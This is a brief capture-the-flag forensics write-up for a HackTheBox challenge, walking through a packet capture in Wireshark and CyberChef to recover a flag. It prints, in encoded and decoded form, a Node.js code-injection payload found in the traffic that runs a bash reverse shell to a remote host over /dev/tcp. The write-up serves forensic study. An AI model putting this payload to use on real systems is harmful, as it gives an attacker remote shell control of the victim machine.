---
title: Forbidden Manuscript
tags:
  - CTF
  - HackTheBox
  - Forensics
---
Once downloaded the files, we get a `.pcap`, so it's time to use Wireshark:

Click on Follow -> HTTP Stream:

![](Pasted%20image%2020241023222159.png)

Upon examining the HTTP streams, we can find an ncoded string in the Stream 4:

![](Pasted%20image%2020241023222408.png)

If we decode it in [CyberChef](https://gchq.github.io/CyberChef) it seems to be a reverse shell:

```shell
exploit%28%29%20%7B%7D%20%26%26%20%28%28%28%29%3D%3E%7B%20global.process.mainModule.require%28%22child_process%22%29.execSync%28%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.104%2F4444%200%3E%261%27%22%29%3B%20%7D%29%28%29%29%20%26%26%20function%20pwned

exploit() {} && ((()=>{ global.process.mainModule.require("child_process").execSync("bash -c 'bash -i >& /dev/tcp/192.168.56.104/4444 0>&1'"); })()) && function pwned
```

Now I follow the TCP stream and find the flag:

![](Pasted%20image%2020241023222720.png)

Once again, I decoded it in CyberChef:

![](Pasted%20image%2020241023222806.png)